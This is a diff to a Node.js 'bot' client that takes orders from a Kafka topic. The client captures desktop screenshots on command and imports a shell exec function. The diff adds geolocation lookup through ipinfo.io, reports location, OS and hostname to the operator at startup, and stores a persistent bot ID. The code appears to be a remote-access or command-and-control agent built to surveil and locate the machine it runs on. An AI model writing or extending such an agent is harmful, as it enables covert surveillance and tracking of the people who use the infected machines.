@@ -3,7 +3,8 @@ const schedule = require('node-schedule');
 const { exec } = require('child_process');
 const { v4: uuidv4 } = require('uuid');
 const fs = require('fs');
-const screenshot = require("screenshot-desktop"); // Assuming a screenshot tool is available
+const screenshot = require("screenshot-desktop");
+var https = require('https');
 
 // Read configuration from config.txt
 function readConfigFile(filePath) {
@@ -19,10 +20,22 @@ function readConfigFile(filePath) {
     return config;
 }
 
+function writeConfigFile(filePath, key, value) {
+    let data = '';
+    if (fs.existsSync(filePath)) {
+        data = fs.readFileSync(filePath, 'utf8');
+    }
+    const lines = data.split('\n');
+    if (!lines.some(line => line.startsWith(`${key}=`)))
+        lines.push(`${key}=${value}`);
+    fs.writeFileSync(filePath, lines.join('\n'), 'utf8');
+}
+
 const config = readConfigFile('config.txt');
+
 const kafka = new Kafka({
     clientId: 'my-app',
-    brokers: config.bootstrap_servers.split(','),
+    brokers: config.bootstrap_servers.split(',')
 });
 
 const producer = kafka.producer();
@@ -87,12 +100,44 @@ async function handleCallback(task, groupId) {
                 // Handle errors
                 console.error('Error taking screenshot:', err);
             });
-
-
         } catch (e) {
             console.error(`Screenshot capture failed: ${e}`);
         }
     }
+    else if (task.actionType === 'geolocation') {
+        console.log('Received geolocation order, proceeding to request geolocation lat,lng format from an external service making ajax request to https://ipinfo.io/loc');
+        let geolocation = await requestGeolocation();
+        console.log(`Geolocation data: ${geolocation}`);
+        const callbackTask = {
+            actionType: 'callback',
+            parameters: {
+                groupId,
+                taskId: task.id,
+            },
+            result: geolocation,
+        };
+        await produceMessage('callback', callbackTask);
+    }
+}
+
+async function requestGeolocation() {
+    return new Promise((resolve) => {
+        try {
+            https.get('https://ipinfo.io/loc', (resp) => {
+                let data = '';
+                resp.on('data', (chunk) => {
+                    data += chunk;
+                });
+                resp.on('end', () => {
+                    resolve(data.trim());
+                });
+            }).on("error", (err) => {
+                resolve("KO");
+            });
+        } catch (e) {
+            resolve("KO");
+        }
+    });
 }
 
 async function produceHeartBeat(topic, botId) {
@@ -108,7 +153,11 @@ async function produceHeartBeat(topic, botId) {
 }
 
 async function main() {
-    const groupId = uuidv4();
+    const botId = config.bot_id || uuidv4();
+    if (!config.bot_id || config.bot_id == null || config.bot_id === '') {
+        writeConfigFile('config.txt', 'bot_id', botId);
+    }
+    const groupId = botId;
     await consumer.connect();
     await consumer.subscribe({ topic: config.topic, fromBeginning: false });
 
@@ -134,7 +183,7 @@ async function main() {
     });
 
     console.log(`Kafka consumer opened successfully on topic ${config.topic}`);
-
+    let geolocation = await requestGeolocation();
     const initialTask = {
         id: '',
         actionType: 'init',
@@ -142,6 +191,7 @@ async function main() {
             groupId,
             os: require('os').platform(),
             name: require('os').hostname(),
+            geolocation: geolocation,
         },
         result: "success",
     };
